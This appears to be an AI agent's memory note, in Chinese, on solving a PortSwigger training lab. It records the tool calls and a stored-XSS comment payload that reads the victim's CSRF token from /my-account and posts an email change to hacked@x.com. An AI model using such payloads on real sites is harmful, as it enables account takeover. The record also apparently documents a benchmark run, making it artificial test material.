---
metadata:
  node_type: memory
name: "PRS arm A lab-perform-csrf"
description: "arm A 基线:lab-perform-csrf 冷实例一次通过 - 评论存储 XSS 窃 CSRF token 改受害者邮箱,banner is-solved"
last_updated: 2026-10-09T04:45:15+08:00
created: 2026-10-09T04:45:15+08:00
---

## 2026-10-09 arm A 基线

- 题面:lab-perform-csrf = "Exploiting XSS to bypass CSRF defenses"(stored XSS in blog comments;steal CSRF token 改访客邮箱);凭证 wiener:peter(未用)。
- 实例获取:`range_launch launch-url /web-security/cross-site-scripting/exploiting/lab-perform-csrf` 信封 instance_url=null(final_url 落到 login.portswigger.net/u/login,reused:false),走回退 `http_session get <launch_url> --follow --jar /tmp/cj1.json` 首跳 302 Location 即实例根
  - 实例 `https://0a88007f03565143809a03560076003e.web-security-academy.net/`,首页 is-notsolved。
- 解法(一条信封一次过):
  1. `http_session get /post?postId=1 --jar /tmp/cj1.json --out` 读评论表单:POST /post/comment,字段 csrf/postId/comment/name/email/website;csrf 与该会话 cookie 绑定。
  2. `http_session post /post/comment --form csrf=… --form postId=1 --form comment=<script>…</script> --form name/email` → 302 /post/comment/confirmation?postId=1。
     - 载荷:`req.open('get','/my-account')` → onload 里 `match(/name="csrf" value="(\w+)"/)[1]` → `c.open('post','/my-account/change-email');c.send('csrf='+t+'&email=hacked@x.com')`。
  3. `http_dump /post?postId=1 --out /tmp/csrf_post2.html` + `search_content 'change-email|req\.open'` 证实载荷在评论体里未被转义存储(注意 http_session 会剥 script 块,验证反射/存储必须走 http_dump 原始体)。
  4. 无需 exploit server(launch 信封 exploit_server:null)、无需登录 wiener:平台的模拟受害者自己浏览评论页执行载荷。
- 判定:再取 /login 时横幅已 `academyLabBanner is-solved` + "Congratulations, you solved the lab!"(从评论投递到 solved 约 1 分钟内,无需轮询等待)。
- 坑:http_dump 首次调用报 "Bad URL: relative URL without a base"(同参数改 http_session 即正常),疑似偶发参数解析问题。

